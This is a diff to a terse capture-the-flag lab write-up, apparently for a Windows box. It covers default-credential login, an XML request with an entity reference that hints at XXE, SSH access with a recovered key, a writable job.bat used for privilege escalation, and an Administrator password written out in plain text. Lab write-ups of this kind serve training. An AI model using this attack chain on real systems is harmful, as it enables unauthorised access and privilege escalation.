@@ -1,6 +1,7 @@
 1. Now i enter the website with port 80 and I can access login page. There is credential here "admin:password".
 ---------------------------------------------------------------------------------------------------------------
 2. Then I intercept the request via using burp suite.
+```bash
 POST /process.php HTTP/1.1
 
 Host: 10.129.160.19
@@ -40,10 +41,12 @@ Connection: keep-alive
 &test;
 
 </item><address>chennai</address></order>
+```
 ------------------------------------------------------------------------------------------
 3. After visiting the source code i can find that user daniel and I approached to fins the ssh keys finaly i got it there.
 -------------------------------------------------------------------------------------------
 4.
+```bash
 ssh -i id_rsa daniel@10.129.160.19     
 The authenticity of host '10.129.160.19 (10.129.160.19)' can't be established.
 ED25519 key fingerprint is SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4.
@@ -54,8 +57,10 @@ Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 daniel@MARKUP C:\Users\daniel>
+```
 --------------------------------------------------------------------------------------------
 5.
+```bash
 PS C:\Users\daniel> cd C:\
 PS C:\> dir
 
@@ -109,5 +114,6 @@ job.bat BUILTIN\Users:(F)
 
 Successfully processed 1 files; Failed processing 0 files
 PS C:\log-Management>
+```
 ---------------------------------------------------------------------------------------
 6. Administrator:Yhk}QE&j<3M
